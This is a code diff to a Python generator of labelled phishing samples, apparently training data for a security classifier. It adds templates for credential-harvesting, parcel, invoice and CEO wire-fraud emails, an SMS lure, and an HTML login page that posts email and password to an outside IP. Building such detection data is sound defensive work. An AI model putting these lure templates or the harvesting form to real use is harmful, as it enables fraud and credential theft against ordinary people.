@@ -1035,24 +1035,129 @@ def gen_malicious_prototype_pollution(n: int) -> list:
 
 
 def gen_malicious_phishing(n: int) -> list:
-    """Generate phishing page/email samples."""
+    """Generate diverse phishing email/page/SMS samples."""
     samples = []
-    brands = ["Microsoft", "Google", "Apple", "Amazon", "PayPal", "Netflix", "Bank of America", "LinkedIn"]
+    brands = ["Microsoft", "Google", "Apple", "Amazon", "PayPal", "Netflix",
+              "Bank of America", "LinkedIn", "Wells Fargo", "Chase", "DHL",
+              "FedEx", "USPS", "Instagram", "Facebook", "Dropbox", "DocuSign"]
+    urgency = ["immediately", "within 24 hours", "before your account is locked",
+               "to avoid suspension", "to prevent unauthorized charges"]
+    domains_tld = ["xyz", "tk", "cc", "top", "buzz", "click", "info", "pw"]
+    names = ["John Smith", "Sarah Johnson", "Michael Chen", "Emily Davis"]
+
+    templates = [
+        # Credential harvesting email
+        lambda b, u: (
+            f"From: security@{b.lower().replace(' ', '')}-verify.com\n"
+            f"To: {random.choice(names).lower().replace(' ', '.')}@example.com\n"
+            f"Subject: Urgent: Your {b} Account Has Been Compromised\n\n"
+            f"Dear Customer,\n\n"
+            f"We have detected unusual activity on your {b} account. "
+            f"Your account will be suspended {u} unless you verify your identity.\n\n"
+            f"Click here to verify: http://{b.lower().replace(' ', '')}-secure-login."
+            f"{random.choice(domains_tld)}/verify?id={rand_hex(16)}\n\n"
+            f"Best regards,\n{b} Security Team"
+        ),
+        # Password reset phish
+        lambda b, u: (
+            f"From: noreply@{b.lower().replace(' ', '')}-account.{random.choice(domains_tld)}\n"
+            f"Subject: Password Reset Request for Your {b} Account\n\n"
+            f"Hello,\n\n"
+            f"We received a request to reset the password for your {b} account. "
+            f"If you did not make this request, someone may be trying to access your account.\n\n"
+            f"Reset your password now: https://{b.lower().replace(' ', '')}."
+            f"{random.choice(domains_tld)}/reset/{rand_hex(32)}\n\n"
+            f"This link expires {u}.\n\n"
+            f"The {b} Team"
+        ),
+        # Invoice/payment phish
+        lambda b, u: (
+            f"From: billing@{b.lower().replace(' ', '')}-invoices.com\n"
+            f"Subject: Invoice #{random.randint(100000,999999)} - Payment Required\n\n"
+            f"Dear Valued Customer,\n\n"
+            f"Your recent {b} order has been processed. Amount: ${random.randint(49,999)}.{random.randint(0,99):02d}\n\n"
+            f"If you did not authorize this transaction, please dispute {u}:\n"
+            f"https://billing-{b.lower().replace(' ', '')}.{random.choice(domains_tld)}/dispute\n\n"
+            f"Attachment: Invoice_{rand_hex(8)}.pdf.exe"
+        ),
+        # Package delivery phish
+        lambda b, u: (
+            f"From: tracking@{b.lower().replace(' ', '')}-delivery.{random.choice(domains_tld)}\n"
+            f"Subject: Your {b} package could not be delivered\n\n"
+            f"Dear Customer,\n\n"
+            f"We attempted to deliver your package (Tracking: {rand_hex(12).upper()}) "
+            f"but were unable to complete the delivery.\n\n"
+            f"Please confirm your delivery address {u} at:\n"
+            f"https://{b.lower().replace(' ', '')}-redelivery.{random.choice(domains_tld)}/confirm\n\n"
+            f"A redelivery fee of ${random.choice(['1.99', '3.50', '4.95'])} applies.\n\n"
+            f"{b} Delivery Services"
+        ),
+        # IT department / internal phish
+        lambda b, u: (
+            f"From: it-helpdesk@{random.choice(['company', 'corp', 'internal'])}.com\n"
+            f"Subject: [IT] Required: Update Your {b} Credentials\n\n"
+            f"All employees,\n\n"
+            f"As part of our security upgrade, all {b} accounts must be re-verified {u}. "
+            f"Failure to comply will result in account lockout.\n\n"
+            f"Verify here: https://sso-portal-{rand_hex(4)}.{random.choice(domains_tld)}/verify\n\n"
+            f"Enter your current {b} username and password to continue.\n\n"
+            f"IT Department"
+        ),
+        # Phishing login page HTML
+        lambda b, u: (
+            f'<html><head><title>{b} - Sign In</title></head>\n'
+            f'<body style="font-family:Arial">\n'
+            f'<div style="max-width:400px;margin:50px auto">\n'
+            f'  <img src="/logo.png" alt="{b}">\n'
+            f'  <h2>Sign in to {b}</h2>\n'
+            f'  <form action="http://{rand_ip()}/harvest" method="POST">\n'
+            f'    <input type="email" name="email" placeholder="Email">\n'
+            f'    <input type="password" name="password" placeholder="Password">\n'
+            f'    <input type="hidden" name="brand" value="{b}">\n'
+            f'    <button type="submit">Sign In</button>\n'
+            f'  </form>\n'
+            f'</div></body></html>'
+        ),
+        # SMS phishing (smishing)
+        lambda b, u: (
+            f"SMS from +1{random.randint(200,999)}{random.randint(1000000,9999999)}:\n\n"
+            f"[{b}] Your account has been locked due to suspicious activity. "
+            f"Verify {u}: http://{b.lower().replace(' ', '')}.{random.choice(domains_tld)}/{rand_hex(6)}"
+        ),
+        # CEO/executive impersonation (BEC)
+        lambda b, u: (
+            f"From: ceo@{random.choice(['company-mail', 'corp-exec', 'internal-msg'])}.{random.choice(domains_tld)}\n"
+            f"Subject: Confidential - Wire Transfer Request\n\n"
+            f"Hi,\n\n"
+            f"I need you to process an urgent wire transfer of ${random.randint(5,50) * 1000:,} "
+            f"to our new vendor. This is time-sensitive and must be completed {u}.\n\n"
+            f"Vendor: {random.choice(['Global Solutions Ltd', 'Pacific Trading Co', 'Apex Consulting'])}\n"
+            f"Account: {random.randint(10000000, 99999999)}\n"
+            f"Routing: {random.randint(100000000, 999999999)}\n\n"
+            f"Do not discuss this with anyone else. I will explain when I return.\n\n"
+            f"Regards,\n{random.choice(names)}\nCEO"
+        ),
+    ]
+
     for _ in range(n):
         brand = random.choice(brands)
-        phish_type = random.choice(["email", "page"])
-        if phish_type == "email":
-            text = f"From: security@{brand.lower().replace(' ', '')}-verify.com\nTo: victim@example.com\nSubject: Urgent: Your {brand} Account Has Been Compromised\n\nDear Customer,\n\nWe have detected unusual activity on your {brand} account. Your account will be suspended within 24 hours unless you verify your identity.\n\nClick here to verify: http://{brand.lower().replace(' ', '')}-secure-login.{random.choice(['xyz', 'tk', 'cc', 'top'])}/verify?id={rand_hex(16)}\n\nIf you did not make this request, please verify immediately to prevent unauthorized access.\n\nBest regards,\n{brand} Security Team"
-        else:
-            text = f'<html>\n<head><title>{brand} - Sign In</title></head>\n<body style="font-family: Arial">\n<div style="max-width: 400px; margin: 50px auto">\n  <img src="/logo.png" alt="{brand}">\n  <h2>Sign in to {brand}</h2>\n  <form action="http://{rand_ip()}/harvest" method="POST">\n    <input type="email" name="email" placeholder="Email">\n    <input type="password" name="password" placeholder="Password">\n    <input type="hidden" name="brand" value="{brand}">\n    <button type="submit">Sign In</button>\n  </form>\n  <p><a href="#">Forgot password?</a></p>\n</div>\n</body></html>'
+        urg = random.choice(urgency)
+        template_fn = random.choice(templates)
+        text = template_fn(brand, urg)
+
+        phish_type = "BEC" if "wire transfer" in text.lower() else \
+                     "smishing" if "SMS from" in text else \
+                     "credential_harvesting" if "password" in text.lower() else \
+                     "social_engineering"
+
         samples.append({
             "text": text,
             "findings": [{
                 "category": "malicious",
                 "subcategory": "malicious.phishing",
                 "severity": "critical",
-                "compliance": [],
-                "fields": {"target_brand": brand, "harvested_fields": ["email", "password"]},
+                "compliance": ["NIST-800-53-SI-3"],
+                "fields": {"target_brand": brand, "phish_type": phish_type},
             }],
         })
     return samples
@@ -1417,7 +1522,7 @@ GENERATORS = {
     "malicious.redos": (gen_malicious_redos, 500),
     "malicious.steganography": (gen_malicious_steganography, 500),
     "malicious.prototype_pollution": (gen_malicious_prototype_pollution, 500),
-    "malicious.phishing": (gen_malicious_phishing, 500),
+    "malicious.phishing": (gen_malicious_phishing, 2000),
     "malicious.xxe": (gen_malicious_xxe, 500),
     "malicious.ssti": (gen_malicious_ssti, 500),
     "malicious.shell": (gen_malicious_shell_synth, 500),
